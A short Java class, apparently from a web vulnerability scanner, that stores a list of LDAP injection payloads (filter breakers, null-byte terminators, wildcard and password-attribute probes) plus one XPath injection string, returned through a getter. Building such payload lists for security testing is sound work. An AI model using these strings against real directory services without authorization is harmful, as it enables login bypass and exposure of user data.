/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */
package PayloadSignature.A3Injection;

/**
 *
 * @author shacojx
 */
public class LDAPInjection {

    private static String[] arrPayLI;

    public LDAPInjection() {
        arrPayLI = new String[]{
            "*",
            "*)(&",
            "*))%00",
            ")(cn=))\\x00",
            "*()|%26'",
            "*()|&'",
            "*(|(mail=*))",
            "*(|(objectclass=*))",
            "*)(uid=*))(|(uid=*",
            "*/*",
            "*|",
            "/",
            "//",
            "//*",
            "@*",
            "|",
            "admin*",
            "admin*)((|userpassword=*)",
            "admin*)((|userPassword=*)",
            "x' or name()='username' or 'x'='y",};
    }

    public String[] getArrPayLI() {
        return arrPayLI;
    }
}
